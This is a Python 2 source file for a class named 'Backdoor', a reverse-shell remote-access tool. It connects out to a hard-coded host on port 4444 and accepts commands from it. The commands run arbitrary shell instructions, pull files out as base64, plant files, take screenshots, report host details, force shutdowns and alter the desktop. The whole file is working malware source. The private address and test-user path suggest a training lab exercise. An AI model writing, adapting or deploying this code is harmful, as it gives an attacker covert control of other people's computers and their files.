#!/usr/bin/env python
import socket
import subprocess
import json
import os
import time
import base64
import sys
import shutil
import pymsgbox
import ctypes
import platform
from pyscreenshot import grab

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        DEVNULL = open(os.devnull, 'wb')
        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)

    def os(self):
        operating_system = platform.platform()
        return "[+] Operating System: " + operating_system

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful."

    def screenshot(self):
        img = grab(childprocess=False)
        filename = os.path.join(time.strftime('%Y_%m_%d_%H_%M_%S') + '.png')
        img.save(filename)
        return '[+] Screenshot saved as: ' + filename

    def ip(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        return "[+] Local IP: " + ip

    def host(self):
        host = socket.gethostname()
        return "[+] Computer Name: " + host

    def shutdown(self):
        os.system('shutdown /s /t 1')
        return '[+] Shutting Down The System'

    def restart(self):
        os.system('shutdown /r /t 1')
        return '[+] Resatrting The System'

    def alert(self):
        alert_text = raw_input('Alertbox Text: ')
        alert_title = raw_input('Alertbox Title: ')
        alert_button_text = raw_input('Alertbox Button Text: ')

        pymsgbox.alert(text=alert_text, title=alert_title, button=alert_button_text)
        return '[+] Alert Send'

    def change_background(self):
        SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, 'C:/Users/IEUser/Desktop/1.jpg', 3)
        return "[+] Wallpaper Changed"

    def run(self):
        while True:
            command = self.reliable_receive()

            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "os":
                    command_result = self.os()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                elif command[0] == "screenshot":
                    command_result = self.screenshot()
                elif command[0] == "ip":
                    command_result = self.ip()
                elif command[0] == "host":
                    command_result = self.host()
                elif command[0] == "shutdown":
                    command_result = self.shutdown()
                elif command[0] == "restart":
                    command_result = self.restart()
                elif command[0] == "alert":
                    command_result = self.alert()
                elif command[0] == "background":
                    command_result = self.change_background()
                elif command[0] == "help":
                    command_result = '\n[!] Thanks for viewing our help page!'
                else:
                    command_result = self.execute_system_command(command)
            except Exception as e:
                command_result = "[-] Error during command execution."

            self.reliable_send(command_result)


try:
    my_backdoor = Backdoor("10.0.2.17", 4444)
    my_backdoor.run()
except Exception:
    sys.exit()